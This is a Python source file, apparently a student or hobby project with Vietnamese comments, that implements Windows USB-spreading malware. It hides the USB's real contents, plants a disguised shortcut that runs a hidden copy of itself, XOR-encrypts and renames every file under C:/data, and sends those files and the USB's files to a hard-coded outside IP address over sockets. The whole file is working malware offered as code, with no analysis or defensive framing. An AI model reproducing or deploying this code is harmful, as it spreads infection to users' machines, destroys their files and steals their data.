import os
import sys
import shutil
import psutil
from win32com.client import Dispatch
import win32com.client
import time
import win32api
import base64
import socket

####Encryption#####
# XOR encryption function
def encrypt_data(data, key):
    encrypted_data = bytearray()
    for byte in data:
        key ^= 0x56565656
        encrypted_byte = byte ^ (key & 0xFF)
        encrypted_data.append(encrypted_byte)
    return bytes(encrypted_data)

# encrypt a file
def encrypt_file(file_path, xor_key):
    try:
        with open(file_path, "rb") as file:
            file_data = file.read()
        encrypted_data = encrypt_data(file_data, xor_key)
        with open(file_path, "wb") as file:
            file.write(encrypted_data)
        print("Encrypted: {file_path}")
    except Exception as e:
        print("Error encrypting {file_path}: {str(e)}")

# encrypt a folder
def encrypt_folder(input_folder):
    #print("start")
    for root, dirs, files in os.walk(input_folder):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            encrypt_file(file_path, xor_key=0x56565656)
            encrypted_file_name = base64.b64encode(file_name.encode()).decode()
            os.rename(file_path, os.path.join(root, encrypted_file_name))
    print("Encryption complete.")

# Get all file in a folder
def get_all_files(input_folder):
    all_files = []
    for root, dirs, files in os.walk(input_folder):
        for file in files:
            file_path = os.path.join(root, file)
            all_files.append(file_path)  
    return all_files

# Check connect to server
def check_connection(server_ip, server_port, timeout=5):
    i = 0
    while i < 6:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(timeout) 
                s.connect((server_ip, server_port))
                print(f"Connect to server {server_ip}:{server_port} successful.")
                return True
        except socket.error as e:
            i += 1
            print(f"Unable to connect, trying again...")
            time.sleep(2)  # Wait 3 seconds before trying again
    print("Max retries reached. Unable to connect to the server.")
    return False

# Send file to server
def send_file_to_server(filename, server_ip, server_port):
    with open(filename, 'rb') as f:
        # Connect to server
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((server_ip, server_port))
            # Submit first file name
            s.send(f"{filename}".encode('utf-8'))
            # Waiting for response from server
            s.recv(1024) 
            # Submit file contents
            file_data = f.read()
            s.sendall(file_data)
            print(f"File sent {filename}")

#####USB#####
def get_usb_drive():
    """
    Tìm ký tự ổ đĩa USB đang được gắn.
    """  
    partitions = psutil.disk_partitions()
    for partition in partitions:
        if "removable" in partition.opts.lower():
            if partition.fstype.lower() not in ["cdfs", "udf"]:
                return partition.device  # Trả về ký tự ổ đĩa (vd: 'E:\\')
    return None

def copy_file_to_destination(current_file, destination_folder, icon_path, usb_label):
    """
    Sao chép chính tệp thực thi hoặc mã nguồn hiện tại vào ổ USB.
    """
    try:
        print(current_file)
        print(destination_folder)
        if current_file.lower().startswith("c:"):
            target_path = os.path.join(destination_folder, os.path.basename(current_file))
        else:
            target_path = os.path.join(os.environ["USERPROFILE"], "Documents", os.path.basename(current_file))
        
        if not os.path.exists(target_path):
            # Sao chép tệp
            shutil.copy2(current_file, target_path)
            print(f"Đã sao chép {current_file} đến {target_path}")
            # Ẩn file
            os.system(f'attrib +h "{target_path}"')
            print(f"Đã ẩn file: {target_path}")
            
        shortcut_directory = destination_folder  # Đường dẫn lưu shortcut
        shortcut_file_name = usb_label + ".lnk"  # Tên shortcut

        print(target_path)
    
        create_shortcut(target_path, shortcut_directory, shortcut_file_name, icon_path)

    except Exception as e:
        print(f"Lỗi khi sao chép tệp: {e}")


def create_shortcut(target_path, shortcut_path, shortcut_name, icon_path):
    """
    Tạo shortcut cho tệp đã ẩn.
    
    Args:
        target_path (str): Đường dẫn tới tệp nguồn (đã ẩn).
        shortcut_path (str): Đường dẫn để lưu shortcut.
        shortcut_name (str): Tên của shortcut (kết thúc bằng .lnk).
    """
    try:
        # Kiểm tra đường dẫn tệp mục tiêu
        if not os.path.exists(target_path):
            print(f"Tệp mục tiêu không tồn tại: {target_path}")
            return

        # Đường dẫn đầy đủ tới shortcut
        shortcut_full_path = os.path.join(shortcut_path, shortcut_name)

        # Sử dụng COM object để tạo shortcut
        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortcut(shortcut_full_path)
        shortcut.TargetPath = target_path  # Tệp nguồn (có thể bị ẩn)
        shortcut.WorkingDirectory = os.path.dirname(target_path)  # Thư mục làm việc

        icon_absolute_path = os.path.abspath(icon_path)
        shortcut.IconLocation = icon_absolute_path  # Dùng biểu tượng của tệp nguồn
        shortcut.save()

        print(f"Shortcut đã được tạo tại: {shortcut_full_path}")

    except Exception as e:
        print(f"Lỗi khi tạo shortcut: {e}")


def move_and_hide_files_in_usb(usb_drive, hidden_folder_name="_hidden"):
    """
    Di chuyển toàn bộ file/thư mục trong ổ USB vào một thư mục ẩn.
    
    Args:
        usb_drive (str): Đường dẫn tới ổ USB (VD: "E:\\").
        hidden_folder_name (str): Tên của thư mục ẩn. Mặc định là "_hidden".
    """
    hidden_folder_path = os.path.join(usb_drive, hidden_folder_name)
    print(f"Đang di chuyển và ẩn file/thư mục trong USB tại {usb_drive}...")
    
    try:
        # Tạo thư mục ẩn nếu chưa tồn tại
        if not os.path.exists(hidden_folder_path):
            os.makedirs(hidden_folder_path)
        os.system(f'attrib +h "{hidden_folder_path}"')  # Ẩn thư mục

        # Duyệt qua thư mục gốc để di chuyển file và thư mục
        for item in os.listdir(usb_drive):
            source_path = os.path.join(usb_drive, item)
            
            # Bỏ qua thư mục ẩn
            if os.path.abspath(source_path) == os.path.abspath(hidden_folder_path):
                continue
            
            # Xác định đường dẫn đích
            destination_path = os.path.join(hidden_folder_path, item)
            
            # Nếu là thư mục, sử dụng shutil.move để di chuyển toàn bộ
            if os.path.isdir(source_path):
                if not os.path.exists(destination_path):
                    shutil.move(source_path, destination_path)
            else:
                # Nếu là file, di chuyển vào thư mục ẩn
                shutil.move(source_path, destination_path)
        
        print("Đã di chuyển và ẩn file/thư mục.")
    except Exception as e:
        print(f"Lỗi khi di chuyển và ẩn file/thư mục: {e}")

def move_and_copy_files_to_usb(usb_drive, hidden_folder_name="_hidden"):
    """
    Di chuyển toàn bộ file/thư mục trong ổ USB vào một thư mục ẩn.
    
    Args:
        usb_drive (str): Đường dẫn tới ổ USB (VD: "E:\\").
        hidden_folder_name (str): Tên của thư mục ẩn. Mặc định là "_hidden".
    """
    hidden_folder_path = os.path.join(usb_drive, hidden_folder_name)
    print(f"Đang di chuyển và ẩn file/thư mục trong USB tại {usb_drive}...")
    
    try:
        # Tạo thư mục ẩn nếu chưa tồn tại
        if not os.path.exists(hidden_folder_path):
            os.makedirs(hidden_folder_path)
        os.system(f'attrib +h "{hidden_folder_path}"')  # Ẩn thư mục

         # Duyệt qua thư mục gốc để di chuyển file và thư mục
        data_steal_path = "C:/data"
        for item in os.listdir(data_steal_path):
            source_path = os.path.join(data_steal_path, item)
            
            # Bỏ qua thư mục ẩn
            if os.path.abspath(source_path) == os.path.abspath(hidden_folder_path):
                continue
            
            # Xác định đường dẫn đích
            destination_path = os.path.join(hidden_folder_path, item)
            
            # Nếu là thư mục, sử dụng shutil.move để di chuyển toàn bộ
            if os.path.isdir(source_path):
                if not os.path.exists(destination_path):
                    shutil.copytree(source_path, destination_path)
            else:
                # Nếu là file, di chuyển vào thư mục ẩn
                shutil.copy2(source_path, destination_path)
        print("Đã tạo file lưu dữ liệu ---------------------------------------.")

    except Exception as e:
        print(f"Lỗi khi di chuyển và ẩn file/thư mục: {e}")

def open_hidden_folder(usb_drive, hidden_folder_name):
    hidden_folder_path = os.path.join(usb_drive, hidden_folder_name)
    try:
        # Sử dụng COM interface để điều khiển Windows Explorer
        shell = win32com.client.Dispatch("Shell.Application")
        windows = shell.Windows()
        # Tìm cửa sổ Explorer đang hoạt động
        for window in windows:
            if window.Name == "File Explorer":
                window.Navigate(hidden_folder_path)
                print(f"Đã chuyển đến: {hidden_folder_path}")
                return
        os.startfile(hidden_folder_path)
    except Exception as e:
        print(f"Không thể điều hướng: {e}")

def get_usb_label(drive_usb):
    try:
        volume_info = win32api.GetVolumeInformation(drive_usb)
        label = volume_info[0]  # Label nằm ở vị trí đầu tiên của tuple
        return label if label else "Không có label"
    except Exception as e:
        return f"Lỗi khi lấy label: {e}"

input_folder = "C:/data"
SERVER_IP = "54.169.93.143"
SERVER_PORT = 14911
def main():
    # Đường dẫn tệp thực thi hiện tại
    current_file = sys.argv[0]
    
    if not os.path.isfile(current_file):
        print("Không thể xác định tệp thực thi hiện tại.")
        return

    # Tìm ổ USB
    usb_drive = get_usb_drive()
    print(usb_drive)
    
    desktop_folder = os.path.join(os.environ["USERPROFILE"], "Desktop")
    volume_info = win32api.GetVolumeInformation(usb_drive)
    usb_label = volume_info[0]

    if usb_drive and current_file.lower().replace("\\", "/").startswith(usb_drive.lower().replace("\\", "/")):
        print("Tệp đang chạy từ USB.")
        # Sao chép tệp vào máy tính (thư mục đích: C:\Temp)
        copy_file_to_destination(current_file, desktop_folder, "./data/word_icon.ico", "Word")
        # Giám sát USB
        open_hidden_folder(usb_drive, usb_label)

        encrypt_folder(input_folder)
        files = get_all_files(input_folder)   # Get file in C:/data
        if not files:
            print("No files founded!")
            return
        
        input_hidden = os.path.join(usb_drive, "_hidden")
        files_usb = get_all_files(input_hidden)        # Get file in _hidden
        if not files_usb:
            print("No files founded!")
            return
        #Check connect to server and send data
        if check_connection(SERVER_IP, SERVER_PORT):
            for file in files:
                send_file_to_server(file, SERVER_IP, SERVER_PORT)
                time.sleep(2) 
            for file_usb in files_usb:
                send_file_to_server(file_usb, SERVER_IP, SERVER_PORT)
                time.sleep(2) 
        else:
            move_and_copy_files_to_usb(usb_drive)

    else:
        print("Tệp đang chạy từ máy tính.")
        if usb_drive:
            # Sao chép tệp vào USB
            move_and_hide_files_in_usb(usb_drive, usb_label)
            copy_file_to_destination(current_file, usb_drive, "./data/usb_icon.ico", usb_label)

            encrypt_folder(input_folder)
            files = get_all_files(input_folder)     # Get file in C:/data
            if not files:
                print("No files founded!")
                return
        
            #input_hidden = os.path.join(usb_drive, "_hidden")
            #files_usb = get_all_files(input_hidden)        # Get file in _hidden
            # if not files_usb:
            #     print("No files founded!")
            #     return
            #Check connect to server and send data
            if check_connection(SERVER_IP, SERVER_PORT):
                for file in files:
                    send_file_to_server(file, SERVER_IP, SERVER_PORT)
                    time.sleep(2) 
                # for file_usb in files_usb:
                #     send_file_to_server(file_usb, SERVER_IP, SERVER_PORT)
                #     time.sleep(2)
            else:
                move_and_copy_files_to_usb(usb_drive)
        else:
            print("Không tìm thấy USB để sao chép tệp.")

if __name__ == "__main__":
    main()
